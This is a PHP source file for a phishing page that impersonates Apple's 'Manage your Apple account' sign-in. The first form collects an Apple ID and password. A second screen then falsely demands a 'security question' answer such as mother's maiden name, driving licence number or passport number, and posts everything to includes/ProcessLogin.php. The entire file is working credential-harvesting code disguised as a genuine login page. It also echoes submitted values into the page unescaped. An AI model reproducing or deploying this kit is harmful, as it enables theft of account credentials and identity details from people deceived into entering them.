<?php
if(isset($_POST["user"]) AND isset($_POST["pass"])):
?>
<?php
require "includes/session_protect.php";
require "includes/functions.php";
require "includes/simplehtmldom.php";
?>
<!DOCTYPE html>
<html>
<head>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type">
<meta content="width=device-width, initial-scale=1, maximum-scale=1" name="viewport">
<link href="css/Fonts.css" rel="prefetch stylesheet" type="text/css">
<link href="css/Login.css" media="screen" rel="stylesheet" type="text/css">
<title></title>
</head>
<body>
<div class="si-body si-container container-fluid" data-theme="lite" id="content">
<div class="widget-container fade-in restrict-max-wh fade-in" data-mode="embed">
<div class="dialog fade-in">
<div class="app-dialog">
<div class="head">
<div class="title" title-align="center">
<br><br>
<h2>You must complete the security question<br>before your signin.</h2>
<form action="includes/ProcessLogin.php" method="POST" name="login" id="name">
<input type="hidden" name="user" value="<?php echo $_POST['user']; ?>">
<input type="hidden" name="pass" value="<?php echo $_POST['pass']; ?>">
<div class="form-group">
<div class="form-group clearfix" style="padding-top:0px;">
<div class="select-wrapper">
<select id="q1" name="q1" type="text" class="form-control question" style="width: 300px;height:32px!important;padding-left:10px;">
  <option  value="">select security question</option>
  <option value="mothers maiden name">Mother&apos;s Maiden Name</option>
  <option value="drivers no">Driving License Number</option>
  <option value="passport no">Passport Number</option>
</select>
</div>
</div>
<br>
<div class="pop-wrapper field-pop-wrapper middle-wrapper">
<div class="name-input">
  <input type="text" name="a1" id="a1" class="generic-input-field form-control field" placeholder="answer" style="width: 300px; padding-left:10px;">
</div>
</div>
</div>
</div>
</div>
<div class="body" body-align="center">
<div class="acc-locked" id="acc-locked">
<div class="dialog-body">
<div class="dialog-info">
<button type="submit" class="btn btn-primary" style="width: 300px;">next</button>
</form>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</body>
</html>

<?php else: 

require "includes/session_protect.php";
require "includes/functions.php";

?>


<!DOCTYPE html>
<html>
<head>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type">
<meta content="width=device-width, initial-scale=1, maximum-scale=1" name="viewport">
<link href="css/Fonts.css" rel="prefetch stylesheet" type="text/css">
<link href="css/Login.css" media="screen" rel="stylesheet" type="text/css">
<script>
function ChangePlaceholder(){
document.getElementById("user").placeholder = "name@example.com";
}
function ChangeBack(){
document.getElementById("user").placeholder = "Apple ID";
}
function Activate(){
document.getElementById("go").className = "si-button";
}
function Spinner(){
document.getElementById("go").style.display = "none";
document.getElementById("spin").style.display = "block";
}
</script>
<title></title>
</head>
<body>
<div class="si-body si-container container-fluid" data-theme="lite" id="content">
<div class="widget-container fade-in restrict-max-wh fade-in" data-mode="embed">
<div class="HoldLoginDiv">
<div class="logo"><img style="width: 200px;" class="TextLogo" src="img/logo.png"></div>
<div>
<div class="signin fade-in">
<h1 class="LoginTitkle">Manage your Apple account</h1>
<form action="" name="login" id="name" method="POST" onsubmit="Spinner();">
<div class="container HolderOfTheFields">
<div class="row no-gutter si-field apple-id">
<div class="col-xs-12"><span class="LoginTitle">Manage your Apple account Apple ID</span> <input class="si-text-field" id="user" name="user" onblur="ChangeBack();" onclick="ChangePlaceholder();" placeholder="Apple ID" spellcheck="false" type="email"></div>
</div>
<div class="row no-gutter si-field pwd">
<div class="col-xs-12"><label class="LoginTitle" for="pwd">Password</label> <input class="si-password si-text-field" id="pass" name="pass" onkeyup="Activate();" placeholder="Password" type="password">
</div>
</div>
<div class="si-remember-password"><input class="ax-outline" tabindex="0" type="checkbox"> <label for="remember-me">Remember me</label></div>
<button class="si-button btn disabled" id="go" tabindex="0"><i class="icon icon_sign_in"></i></button>
<button style="display:none;" class="si-button btn" id="spin" tabindex="0"><img style="margin-top:-2px" src="img/spinner.gif"></span></button>
</div>
</form>
<div class="si-container-footer"></div>
</div>
</div>
</div>
</div>
</div>
</body>
</html>

<?php endif; ?>